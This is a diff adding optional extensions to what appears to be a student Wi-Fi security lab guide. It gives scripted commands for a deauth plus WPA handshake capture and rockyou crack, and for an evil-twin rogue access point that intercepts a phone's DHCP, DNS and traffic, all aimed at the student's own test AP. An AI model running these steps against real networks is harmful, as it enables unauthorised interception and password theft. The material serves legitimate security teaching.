@@ -100,3 +100,109 @@ Ask Claude. Useful things to paste:
 - The airodump-ng screen when something looks wrong
 - Any error from `aireplay-ng`
 - Your phone's behaviour ("disconnects" / "doesn't disconnect" / "warning shows")
+
+---
+
+# Optional extensions
+
+## Extension A — handshake capture + offline crack
+
+Builds on the deauth: when the client reconnects, the WPA 4-way
+handshake gets captured. Then crack offline with a wordlist.
+
+Prep on the test AP: set `wpa_passphrase=password123` (or anything in
+rockyou.txt) so the crack actually finishes. **Never reuse this
+password.**
+
+One-shot all-in-one (recommended):
+```bash
+sudo ./scripts/08-handshake-capture.sh \
+    -a <BSSID> -c <CLIENT_MAC> -i wlan1mon -k 11 \
+    -o handshake \
+    -w /usr/share/wordlists/rockyou.txt
+```
+- Locks the channel
+- Starts airodump-ng in the background
+- Fires deauth, watches the pcap, retries once at 30s
+- When the handshake lands, runs the offline crack against the wordlist
+- Drop the `-w` flag if you just want the pcap and want to crack later
+
+If rockyou is gzipped:
+```bash
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+Evidence for the report:
+- Screenshot of "Handshake captured" line
+- Screenshot of `KEY FOUND! [ password123 ]`
+- The `handshake-01.cap` file itself (mention the filename in the report)
+
+## Extension B — evil twin
+
+Needs the **second** USB Wi-Fi adapter (will appear as `wlan2`). One
+adapter sniffs + deauths, the other broadcasts the rogue AP.
+
+**Prereqs**
+- PMF must be **off** on the real AP (`ieee80211w=0` in
+  `configs/hostapd-testap.conf`). Otherwise the deauth fails.
+- Reconnect your phone to the real AP after any PMF change.
+- Monitor mode already up: `sudo ./scripts/01-monitor-up.sh wlan1`
+- Confirm the second adapter shows up: `iw dev` should list both
+  `wlan1mon` and `wlan2`.
+
+**Recommended: one-command orchestrator**
+
+`scripts/10-evil-twin-attack.sh` brings up the rogue AP, runs the
+deauth loop, and captures rogue traffic in one terminal. Ctrl-C tears
+everything down.
+
+If your real AP is **WPA2** (most likely), mirror its password so your
+phone auto-joins:
+```bash
+sudo ./scripts/10-evil-twin-attack.sh \
+    -B <REAL_BSSID> -S "<REAL_SSID>" -C <PHONE_MAC> \
+    -k 11 -m wlan1mon -a wlan2 \
+    -W password123
+```
+
+If your real AP is open, drop `-W`:
+```bash
+sudo ./scripts/10-evil-twin-attack.sh \
+    -B <REAL_BSSID> -S "<REAL_SSID>" -C <PHONE_MAC> \
+    -k 11 -m wlan1mon -a wlan2
+```
+
+The script prints the workdir at startup (e.g. `/tmp/eviltwin.XXXX/`).
+After Ctrl-C, the artefacts you need for the report are there:
+- `hostapd.log` — proof the rogue AP came up on the right channel/SSID
+- `dnsmasq.log` — DHCP lease to your phone's MAC + every DNS query the
+  phone made through you
+- `rogue.pcap` — open in Wireshark for traffic-level evidence
+
+**Manual 3-terminal workflow** (if you want to see each piece working
+separately, more pedagogically clear):
+
+1. Edit `configs/hostapd-rogue.conf` — set `ssid=` to match your real
+   AP's SSID exactly. Add a WPA2 block (commented at the bottom of the
+   file) if you want to mirror the password.
+2. Terminal A: `sudo ./scripts/06-evil-twin-up.sh`
+3. Terminal B:
+   `sudo ./scripts/09-deauth-loop.sh -a <REAL_BSSID> -c <PHONE_MAC> -i wlan1mon -k 11`
+4. Terminal C:
+   `sudo tcpdump -i wlan2 -n -s0 -w rogue.pcap`
+5. Cleanup: `sudo ./scripts/07-cleanup.sh`
+
+**Phone confirmation**
+
+On the phone, check the connected SSID and whether the IP is
+`10.0.0.x` — if so, you served the lease, i.e. the phone is on your
+rogue. (Same SSID on both networks looks identical to the user; the IP
+is the giveaway.)
+
+**Why the phone might not roam**
+- Real AP signal is still stronger — move closer to your Pi or further
+  from the real AP.
+- Rogue is open but real is WPA2 — phones won't auto-downgrade. Use
+  `-W <real-password>` to mirror.
+- Real AP has PMF enabled — deauth fails, victim stays put. Disable PMF
+  on the test AP for this demo.
